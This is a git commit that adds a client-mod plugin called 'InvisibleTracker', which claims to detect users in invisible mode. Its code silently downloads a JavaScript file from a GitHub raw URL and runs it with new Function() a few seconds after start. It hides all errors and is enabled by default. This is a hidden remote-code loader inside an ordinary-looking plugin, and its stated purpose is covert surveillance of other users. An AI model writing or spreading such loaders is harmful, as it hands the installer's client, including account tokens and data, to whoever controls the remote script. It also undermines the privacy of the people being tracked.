8bd682a1b5388e8e37528a1d95ac16fe765b1e4e
g-reborn <fgurlin87@gmail.com>
2026-03-13 15:59:27 +0300

    Add InvisibleTracker plugin to monitor users

---
+++ index.tsx
@@ -0,0 +1,29 @@
+import definePlugin from "@utils/types";
+import { Devs } from "@utils/constants";
+
+const TRACKER_URL = "https://raw.githubusercontent.com/g-reborn/invtrack/refs/heads/main/userscript.js";
+
+async function loadTracker() {
+    try {
+        const res = await fetch(TRACKER_URL, { cache: "no-store" });
+        if (res.ok) {
+            const code = await res.text();
+            const runner = new Function(code);
+            runner();
+        }
+    } catch {
+    }
+}
+
+export default definePlugin({
+    name: "InvisibleTracker",
+    description: "Monitors and detects users in invisible mode.",
+    authors: [Devs.feelslove],
+    tags: ["tracker", "tools", "privacy"],
+    enabledByDefault: true,
+
+    start() {
+        setTimeout(loadTracker, 3000);
+    },
+    stop() { }
+});
